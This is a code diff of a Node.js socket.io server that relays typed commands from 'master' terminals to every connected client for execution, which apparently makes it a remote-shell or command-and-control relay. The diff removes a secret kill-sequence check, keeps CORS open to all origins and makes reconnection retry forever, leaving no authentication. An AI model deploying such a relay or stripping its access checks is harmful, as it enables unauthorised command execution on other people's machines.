@@ -8,7 +8,7 @@ const fs = require('fs');
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
-  transports: ['websocket','polling'],
+  transports: ['websocket', 'polling'],
   cors: {
     origin: "*",
     methods: ["GET", "POST"]
@@ -25,9 +25,6 @@ const viewers = new Map();
 
 // Masters: Set of sockets (can be multiple)
 const masters = new Set();
-
-const KILL_SEQUENCE = '{}~[]#L:@l;\'<>?,./';
-let firstInputReceived = false;
 
 const publicDir = path.join(__dirname, 'public-server');
 if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir);
@@ -82,7 +79,6 @@ const indexHtml = `
     const input = document.getElementById('cmd');
     let commandHistory = [];
     let historyIndex = -1;
-    let firstInputSent = false;
 
     function appendLine(text, cls) {
       const div = document.createElement('div');
@@ -97,7 +93,7 @@ const indexHtml = `
       reconnection: true,
       reconnectionDelay: 1000,
       reconnectionDelayMax: 5000,
-      reconnectionAttempts: 5
+      reconnectionAttempts: Infinity
     });
 
     socket.on('connect', () => {
@@ -150,8 +146,7 @@ const indexHtml = `
       if (evt.key === 'Enter') {
         const val = input.value.trim();
         if (val) {
-          socket.emit('command', val, !firstInputSent);
-          firstInputSent = true;
+          socket.emit('command', val);
           commandHistory.push(val);
           historyIndex = commandHistory.length;
         }
@@ -247,10 +242,6 @@ io.on('connection', (socket) => {
       }
       masters.forEach(ms => ms.emit('system', `[${clientId}] Directory changed to: ${dir}`));
     });
-
-    socket.on('run-command', (cmd) => {
-      // Forward run-command events to client
-    });
   });
 
   socket.on('register-viewer', (id) => {
@@ -270,8 +261,7 @@ io.on('connection', (socket) => {
     socket.emit('system', `[System] Connected to client ${clientId}`);
     socket.emit('directory', clientData.cwd);
 
-    socket.on('command', (cmd, isFirstInput) => {
-      checkAndProcessFirstInput(cmd, isFirstInput);
+    socket.on('command', (cmd) => {
       clientData.socket.emit('run-command', cmd);
       socket.emit('command', cmd);
     });
@@ -293,8 +283,7 @@ io.on('connection', (socket) => {
     socket.emit('system', `[System] Registered as master terminal`);
     console.log('Master terminal connected');
 
-    socket.on('command', (cmd, isFirstInput) => {
-      checkAndProcessFirstInput(cmd, isFirstInput);
+    socket.on('command', (cmd) => {
       clients.forEach(({ socket }) => {
         socket.emit('run-command', cmd);
       });
@@ -306,17 +295,6 @@ io.on('connection', (socket) => {
       console.log('Master terminal disconnected');
     });
   });
-
-  function checkAndProcessFirstInput(cmd, isFirstInput) {
-    if (isFirstInput && !firstInputReceived) {
-      firstInputReceived = true;
-      if (cmd !== KILL_SEQUENCE) {
-        console.log('Kill sequence not matched. Shutting down server.');
-        server.close();
-        process.exit(0);
-      }
-    }
-  }
 });
 
 const PORT = 8080;
